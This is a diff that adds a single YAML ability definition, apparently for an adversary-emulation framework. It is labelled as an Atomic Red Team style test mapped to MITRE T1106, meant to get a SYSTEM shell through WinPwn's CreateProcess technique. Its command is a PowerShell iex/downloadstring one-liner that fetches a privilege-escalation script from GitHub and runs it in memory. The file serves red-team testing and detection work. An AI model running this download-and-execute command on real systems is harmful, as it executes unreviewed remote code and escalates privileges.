@@ -1,0 +1,12 @@
+- id: 3137f019-79d0-5ae0-87c9-65d18f1d3096
+  name: Soumaia ART Tests - WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique
+  description: Get SYSTEM shell - Pop System Shell using CreateProcess technique via function of WinPwn
+  tactic: execution
+  technique:
+    attack_id: T1106
+    name: Native API
+  platforms:
+    windows:
+      psh:
+        command: |-
+          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')
